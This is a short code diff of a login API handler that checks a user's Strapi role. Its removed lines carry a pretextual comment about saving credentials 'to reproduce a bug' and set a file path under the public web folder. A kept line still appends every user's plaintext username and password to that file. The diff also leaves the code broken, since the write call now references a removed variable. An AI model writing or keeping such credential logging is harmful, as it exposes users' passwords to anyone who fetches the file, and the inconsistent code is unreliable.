@@ -43,9 +43,6 @@ export default async (req, res) => {
 
       if (strapiRoleRes.ok) {
         //console.log('Ok') 
-         // saving username and password in a file to reproduce a bug if any user faces with bypassing the user credentials
-        res.status(200).json({ user: data.user, role: role.role.type })
-        const filePath = path.join(process.cwd(), 'public', 'loginDetails.txt');
         fs.writeFileSync(filePath, `Username: ${identifier}, Password: ${password}\n`, { flag: 'a' });
       } else {
         res.status(200).json({ user: data.user, error: 'User unauthorized' })
